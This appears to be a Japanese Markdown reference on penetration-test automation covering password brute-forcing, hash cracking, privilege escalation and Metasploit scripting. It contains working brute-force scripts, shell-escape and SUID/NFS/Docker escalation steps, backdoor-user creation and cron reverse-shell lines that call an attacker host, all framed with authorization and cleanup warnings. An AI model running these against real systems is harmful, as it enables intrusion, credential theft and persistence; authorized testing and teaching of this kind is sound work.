# EXPLOITATION.md - ペネトレーションテスト自動化リファレンス

セキュリティ監査・認定ペネトレーションテスト向けのBashスクリプト活用パターン。
本書の内容は**許可を得たシステムに対してのみ**適用すること。

---

## Ch6 - パスワードセキュリティテスト

### パスワード攻撃の分類

| 種類 | 手法 | 主な用途 |
|------|------|---------|
| ソーシャルエンジニアリング | フィッシング・偽ページ | 情報収集フェーズ |
| ブルートフォース | 全文字組み合わせ | オフラインクラック |
| 辞書攻撃 | ワードリスト使用 | オンライン/オフライン両対応 |
| アルゴリズム攻撃 | パターン推測 | 予測可能パスワード |
| レインボーテーブル | 事前計算ハッシュ | オフラインのみ |

### ネットワークサービス列挙

```bash
# 稼働サービスの詳細スキャン（ペネトレーションテスト対象のみ）
nmap -A <target_ip>

# SMBユーザー列挙
nmap --script=smb-enum-users <target_ip>

# 認証が必要なサービス一覧の確認
nmap -p 21,22,23,25,80,443,5432 -sV <target_ip>
```

### ワードリスト生成戦略

```bash
# 基本的なワードリスト（rockyou.txt）
ls /usr/share/wordlists/rockyou.txt

# rsmangler: 既存リストからパーミュテーション生成
# --file: 入力ワードリスト, --output: 出力先
rsmangler --file base_words.txt --output permutations.txt

# CeWL: ターゲットWebサイトからワードリスト生成
# -d: クロール深度, -m: 最小文字数
cewl -d 2 -m 5 -w site_words.txt http://target.example.com
```

**ワードリスト品質のポイント**:
- 組織名・製品名・地名を含める
- 数字サフィックス（123, 2024等）のバリエーション
- 大文字/小文字の変換パターン

### Hydra によるネットワーク認証テスト

```bash
# FTP認証テスト
# -L: ユーザーリスト, -P: パスワードリスト, -e nsr: null/ユーザー名/逆順テスト
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
  -e nsr ftp://<target_ip>

# SSH認証テスト（スレッド数を制限してレート制限回避）
hydra -L users.txt -P passwords.txt -t 3 ssh://<target_ip>

# 複数ターゲットへの一括テスト
hydra -L users.txt -P passwords.txt -M targets.txt ssh

# PostgreSQL認証テスト
hydra -L users.txt -P passwords.txt postgres://<target_ip>

# Webフォーム認証テスト
# "username=^USER^&password=^PASS^": POSTパラメータ形式
# "F=Login failed": 失敗時のレスポンス文字列
hydra -L users.txt -P passwords.txt \
  http-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"
```

**Hydra 主要オプション**:

| オプション | 説明 |
|-----------|------|
| `-L` | ユーザーリストファイル |
| `-P` | パスワードリストファイル |
| `-e nsr` | null/ユーザー名/逆順の追加テスト |
| `-t` | 並列スレッド数 |
| `-M` | ターゲットリストファイル |
| `-o` | 結果出力ファイル |
| `-f` | 最初の成功で停止 |

### SSH認証テスト Bash スクリプト

```bash
#!/usr/bin/env bash
# SSH認証テストスクリプト（認証済み対象のみ使用）
set -euo pipefail

TARGET="${1:?Usage: $0 <target_ip> <user_list> <pass_list>}"
USER_LIST="${2:?User list required}"
PASS_LIST="${3:?Password list required}"
LOG_FILE="ssh_results_$(date +%Y%m%d_%H%M%S).log"

echo "[*] SSH authentication test: ${TARGET}" | tee "${LOG_FILE}"

while IFS= read -r user; do
  while IFS= read -r pass; do
    # sshpass: 非対話型SSHパスワード認証
    if sshpass -p "${pass}" ssh -o StrictHostKeyChecking=no \
       -o ConnectTimeout=3 "${user}@${TARGET}" 'echo success' 2>/dev/null; then
      echo "[+] SUCCESS: ${user}:${pass}" | tee -a "${LOG_FILE}"
    fi
  done < "${PASS_LIST}"
done < "${USER_LIST}"
```

### John the Ripper によるオフラインハッシュ解析

```bash
# /etc/passwd と /etc/shadow を結合（root権限が必要）
unshadow /etc/passwd /etc/shadow > combined.txt

# シングルモード（ユーザー名ベースの推測）
john --single combined.txt

# 辞書モード
john --wordlist=/usr/share/wordlists/rockyou.txt combined.txt

# インクリメンタルモード（ブルートフォース）
john --incremental combined.txt

# 解析済みパスワードの表示
john --show combined.txt

# john.pot（結果キャッシュ）の場所
cat ~/.john/john.pot
```

**主要なパスワードハッシュ形式**:

| プレフィックス | アルゴリズム | 特徴 |
|--------------|------------|------|
| `$1$` | MD5 | 古い形式、比較的高速 |
| `$6$` | SHA-512 | RHEL/CentOS系デフォルト |
| `$y$` | yescrypt | Ubuntu 22.04+のデフォルト |

```bash
# SSH秘密鍵のパスフレーズ解析
# ssh2john: 秘密鍵をJohnが読める形式に変換
python3 /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

### John + Hydra 統合スクリプト

```bash
#!/usr/bin/env bash
# オフライン解析後にオンライン検証を行う統合テスト
set -euo pipefail

SHADOW_FILE="${1:?Shadow file required}"
TARGET="${2:?Target IP required}"
WORDLIST="${3:-/usr/share/wordlists/rockyou.txt}"

# Step 1: オフラインハッシュ解析
echo "[*] Offline hash analysis..."
unshadow /etc/passwd "${SHADOW_FILE}" > /tmp/combined.txt
john --wordlist="${WORDLIST}" /tmp/combined.txt

# Step 2: 解析結果を抽出してHydraで検証
echo "[*] Extracting cracked credentials..."
john --show /tmp/combined.txt | grep ':' | \
  awk -F: '{print $1 ":" $2}' > /tmp/cracked.txt

echo "[*] Verifying via SSH..."
hydra -C /tmp/cracked.txt -t 3 "ssh://${TARGET}"
```

---

## Ch7 - 権限昇格テクニック

### 権限昇格の調査フロー

```bash
# 現在のユーザー権限確認
id
whoami

# sudo権限の確認（ペネトレーションテスト基本調査）
sudo -l

# SUID設定ファイルの列挙
find / -perm -4000 -type f 2>/dev/null

# 書き込み可能なcronジョブの確認
ls -la /etc/cron* /var/spool/cron/
cat /etc/crontab
```

### sudo 設定ミスの悪用

```bash
# sudo -l の出力例（要確認）
# (root) NOPASSWD: /usr/bin/vim

# vim のシェルエスケープ（vim が sudo で実行可能な場合）
sudo vim -c ':!/bin/bash'

# または vim 内から実行
# :set shell=/bin/bash
# :shell
```

**安全な sudo 設定のベストプラクティス**:
- `visudo` ではなく `sudoedit` を使用（シェルエスケープ不可）
- 特定コマンドのみに権限を限定（ワイルドカード禁止）
- `NOPASSWD` は必要最小限に

### SUID バイナリの悪用

```bash
# SUID ファイルの検索
find / -perm -4000 -type f 2>/dev/null | sort

# nmap の古いバージョン（インタラクティブモード）
# nmap --interactive が利用可能な場合
nmap --interactive
# nmap> !sh でシェル取得

# GTFOBins 的な SUID 悪用パターン（確認ポイント）
# /usr/bin/find: -exec /bin/bash パターン
# /usr/bin/vim: シェルエスケープ経由
```

**GTFOBins 確認ポイント（テスト時の調査対象）**:
- `find` バイナリに SUID がついている場合
- `vim` / `nano` エディタに SUID がついている場合
- スクリプトインタープリタ（python3, perl, ruby等）に SUID がついている場合

### バックドアユーザーの作成（テスト後は削除必須）

```bash
# テスト用ユーザー作成（ペネトレーションテスト環境のみ）
sudo useradd -m -s /bin/bash testuser
echo "testuser:TestPassword123" | sudo chpasswd

# sudo グループへの追加（Ubuntu/Debian系）
sudo usermod -aG sudo testuser

# テスト完了後の削除（必須）
sudo userdel -r testuser
```

### cron による持続的接続（永続化テスト）

```bash
# crontab の確認
crontab -l

# リバースシェルのテスト設定（テスト環境のみ）
# @reboot: 起動時実行
# */5 *: 5分毎実行
# nc: netcat でリバース接続

# テスト用 crontab エントリの形式
# @reboot /bin/nc <attacker_ip> <port> -e /bin/bash
# */5 * * * * /bin/nc <attacker_ip> <port> -e /bin/bash
# ※テスト完了後は必ず crontab -r で削除する
```

### NFS 設定ミスの検証

```bash
# NFS マウントポイントの列挙
showmount -e <target_ip>

# no_root_squash 設定の確認（サーバー側）
cat /etc/exports
# no_root_squash が設定されている場合、クライアントのrootがサーバーのrootとして動作

# テスト手順（認可済み環境のみ）
mkdir -p /tmp/nfs_mount
mount -t nfs <target_ip>:/share /tmp/nfs_mount

# SUID バイナリを配置してテスト
gcc -o /tmp/nfs_mount/shell shell.c
chown root:root /tmp/nfs_mount/shell
chmod u+s /tmp/nfs_mount/shell

# テスト後のクリーンアップ（必須）
rm /tmp/nfs_mount/shell
umount /tmp/nfs_mount
```

**NFS セキュリティのベストプラクティス**:
- `root_squash` を常に有効にする（デフォルト）
- `no_root_squash` は絶対に使用しない
- アクセスをIP範囲で制限する

### Docker コンテナエスケープの検証

```bash
# 特権コンテナからのホストアクセステスト
# Method 1: UID 0 の別アカウント作成（ホストの /etc/passwd を変更）
docker run -v /:/homeroot ubuntu bash
# コンテナ内で /homeroot/etc/passwd に root UID エントリを追記して検証

# Method 2: sudo グループへの追加（ホストの /etc/group を変更）
# コンテナ内から /homeroot/etc/group の sudo グループ行を変更して検証

# テスト後のクリーンアップ（必須）
# 追加したエントリを /etc/passwd, /etc/shadow, /etc/group から削除
```

**Docker セキュリティのベストプラクティス**:
- `--privileged` フラグを使用しない
- ホストの `/` をマウントしない
- 最小権限の原則を適用
- rootless Docker の使用を検討

---

## Ch8 - Metasploit 自動化

### Metasploit モジュール構造

| モジュール種別 | 用途 | 例 |
|--------------|------|-----|
| `auxiliary` | スキャン・フィンガープリント・ファジング | `scanner/ssh/ssh_login` |
| `exploits` | 脆弱性を悪用してペイロード実行 | `unix/ssh/*` |
| `payloads` | エクスプロイト成功後の実行コード | `meterpreter/reverse_tcp` |
| `post` | 侵入後の情報収集・権限昇格 | `multi/recon/local_exploit_suggester` |

### msfconsole 対話モード

```bash
# Metasploit コンソール起動
msfconsole -q  # -q: バナー非表示

# SSH認証テスト（auxiliary モジュール使用例）
msf6> use auxiliary/scanner/ssh/ssh_login
msf6> show options

# オプション設定
msf6> set RHOSTS 192.168.1.0/24
msf6> set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6> set USER_FILE /tmp/users.txt
msf6> set BRUTEFORCE_SPEED 3
msf6> set USER_AS_PASS true
msf6> set VERBOSE false

# 実行
msf6> run

# セッション管理
msf6> sessions -l                    # セッション一覧
msf6> sessions -i 1                  # セッション1に接続
msf6> sessions -u 1                  # シェルをMeterpreterへアップグレード
```

### Meterpreter セッション活用

```bash
# Meterpreter セッション内のコマンド
meterpreter> sysinfo              # システム情報
meterpreter> getuid               # 現在のユーザーID
meterpreter> shell                # ネイティブシェルへ移行
meterpreter> background           # バックグラウンドに戻る

# 権限昇格サジェスタ（post モジュール）
msf6> use post/multi/recon/local_exploit_suggester
msf6> set SESSION 1
msf6> run
```

### Resource スクリプト（.rc ファイル）

繰り返し実行する操作を自動化するための設定ファイル。

```bash
# ssh_login.rc の例（コメント行: #）
# use auxiliary/scanner/ssh/ssh_login
# set RHOSTS 192.168.1.100
# set PASS_FILE /usr/share/wordlists/rockyou.txt
# set USER_FILE /tmp/users.txt
# set BRUTEFORCE_SPEED 3
# set VERBOSE false
# run
# sessions -l

# resource スクリプトの実行方法
msfconsole -r ssh_login.rc          # ファイル指定
msfconsole -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS 192.168.1.100; run"  # インライン
msfconsole -q -r ssh_login.rc       # バナーなし・静音実行
```

### Bash から Metasploit を自動化

```bash
#!/usr/bin/env bash
# Metasploit SSH スキャン自動化スクリプト
set -euo pipefail

TARGETS=("192.168.1.100" "192.168.1.101" "192.168.1.102")
PASS_FILE="${1:-/usr/share/wordlists/rockyou.txt}"
USER_FILE="${2:-/tmp/users.txt}"
# スレッド数を CPU コア数から自動計算
THREADS=$(( $(nproc) * 2 ))
LOG_DIR="msf_results_$(date +%Y%m%d_%H%M%S)"

mkdir -p "${LOG_DIR}"

for target in "${TARGETS[@]}"; do
  echo "[*] Testing: ${target}"

  # resource スクリプトを動的生成
  cat > /tmp/msf_scan.rc << EOF
use auxiliary/scanner/ssh/ssh_login
set RHOSTS ${target}
set PASS_FILE ${PASS_FILE}
set USER_FILE ${USER_FILE}
set BRUTEFORCE_SPEED 3
set THREADS ${THREADS}
set VERBOSE false
run
sessions -l
exit
EOF

  # Metasploit 実行・結果を保存
  msfconsole -q -r /tmp/msf_scan.rc 2>&1 | tee "${LOG_DIR}/${target}.log"
done

echo "[+] Results saved to: ${LOG_DIR}/"
```

### PostgreSQL 連携ワークスペース管理

```bash
# Metasploit データベース接続確認
msf6> db_status

# ワークスペースの管理
msf6> workspace                          # 一覧表示
msf6> workspace -a pentest_2024_q1       # 新規ワークスペース作成
msf6> workspace pentest_2024_q1          # ワークスペース切り替え

# db_nmap: 結果をDBに自動保存
msf6> db_nmap -A -p 22,80,443 192.168.1.0/24
msf6> db_nmap --script=vulners.nse 192.168.1.100

# スキャン結果の参照
msf6> hosts                              # 発見されたホスト一覧
msf6> services                           # 発見されたサービス一覧
msf6> vulns                              # 発見された脆弱性一覧
```

### 統合自動化スクリプト（スキャン〜レポート）

```bash
#!/usr/bin/env bash
# ペネトレーションテスト統合スクリプト
# 使用前に対象の書面による許可を取得すること
set -euo pipefail
IFS=$'\n\t'

NETWORK="${1:?Usage: $0 <network_cidr> [wordlist]}"
WORDLIST="${2:-/usr/share/wordlists/rockyou.txt}"
REPORT_DIR="pentest_$(date +%Y%m%d_%H%M%S)"
WORKSPACE="scan_$(date +%Y%m%d)"

mkdir -p "${REPORT_DIR}"

log() { echo "[$(date '+%H:%M:%S')] $*" | tee -a "${REPORT_DIR}/pentest.log"; }

# Phase 1: ネットワークスキャン
log "Phase 1: Network reconnaissance"
cat > /tmp/recon.rc << EOF
workspace -a ${WORKSPACE}
db_nmap -sV -p 21,22,23,25,80,443,3306,5432 ${NETWORK}
db_nmap --script=vulners.nse ${NETWORK}
hosts -o ${REPORT_DIR}/hosts.csv
services -o ${REPORT_DIR}/services.csv
vulns -o ${REPORT_DIR}/vulns.csv
exit
EOF
msfconsole -q -r /tmp/recon.rc 2>&1 | tee "${REPORT_DIR}/recon.log"

# Phase 2: SSH認証テスト（発見されたSSHホストに対して）
log "Phase 2: SSH authentication testing"
SSH_HOSTS=$(grep ",22," "${REPORT_DIR}/services.csv" 2>/dev/null | awk -F',' '{print $1}' || true)

if [[ -n "${SSH_HOSTS}" ]]; then
  echo "${SSH_HOSTS}" > /tmp/ssh_targets.txt
  cat > /tmp/ssh_test.rc << EOF
workspace ${WORKSPACE}
use auxiliary/scanner/ssh/ssh_login
set RHOSTS file:/tmp/ssh_targets.txt
set PASS_FILE ${WORDLIST}
set BRUTEFORCE_SPEED 3
set VERBOSE false
run
sessions -l
exit
EOF
  msfconsole -q -r /tmp/ssh_test.rc 2>&1 | tee "${REPORT_DIR}/ssh_test.log"
fi

log "Pentest complete. Reports saved to: ${REPORT_DIR}/"
```

---

## 倫理・法的注意事項

- **書面による許可**: すべてのペネトレーションテストは事前に書面による許可が必要
- **スコープ遵守**: 合意されたスコープ外のシステムには絶対にアクセスしない
- **データ保護**: テスト中に取得した認証情報・データは安全に管理し、報告後に削除
- **クリーンアップ**: テスト中に作成したバックドア・アカウント・ファイルは必ず削除
- **記録**: すべての操作をログに残し、報告書に含める
- **報告**: 発見した脆弱性は速やかにクライアントに報告する

---

## 関連ファイル

- `SKILL.md` - スキル概要
- `CHEATSHEET.md` - Bashコマンドクイックリファレンス
- `PATTERNS.md` - 設計パターン・ベストプラクティス
- `SECURITY.md` - セキュリティハードニング
